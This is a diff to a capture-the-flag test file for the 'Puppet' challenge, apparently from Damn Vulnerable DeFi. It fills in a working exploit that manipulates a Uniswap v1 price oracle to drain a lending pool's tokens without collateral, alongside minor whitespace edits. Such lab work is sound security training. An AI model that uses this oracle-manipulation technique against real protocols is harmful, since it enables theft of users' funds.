@@ -3,7 +3,7 @@ const { accounts, contract, web3 } = require('@openzeppelin/test-environment');
 const { expect } = require('chai');
 
 // Hacky way to easily get the Uniswap v1 contracts as artifacts
-// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi 
+// These were taken straight from https://github.com/Uniswap/uniswap-v1/tree/c10c08d81d6114f694baa8bd32f555a40f6264da/abi
 contract.artifactsDir = 'build-uniswap-v1';
 const UniswapExchange = contract.fromArtifact('UniswapV1Exchange');
 const UniswapFactory = contract.fromArtifact('UniswapV1Factory');
@@ -54,7 +54,7 @@ describe('[Challenge] Puppet', function () {
             this.uniswapExchange.address,
             { from: deployer }
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await this.token.approve(
             this.uniswapExchange.address,
@@ -92,12 +92,28 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // Approve all token balance
+        await this.token.approve(
+          this.uniswapExchange.address,
+          ATTACKER_INITAL_TOKEN_BALANCE,
+          { from: attacker }
+        );
+
+        // Exchange DVL tokens on Uniswap to minimize ETH/DVL ratio https://iphelix.medium.com/damn-vulnerable-defi-challenge-8-walkthrough-4e0d752d21ab
+        const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+        await this.uniswapExchange.tokenToEthSwapInput(
+          ether('0.003'), // sell just 2 WEI of DVL to cover fees and
+          // still get the minimum of 1 WEI of ETH
+          1, // any amount over 1 WEI
+          deadline,
+          {from: attacker})
+
+        await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {from: attacker, value: 0});
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Attacker has stolen all tokens from the pool
         expect(
             await this.token.balanceOf(attacker)
@@ -105,7 +121,7 @@ describe('[Challenge] Puppet', function () {
         expect(
             await this.token.balanceOf(this.lendingPool.address)
         ).to.be.bignumber.eq('0');
-        
+
         // Attacker ETH balance has not decreased
         expect(
             await balance.current(attacker)
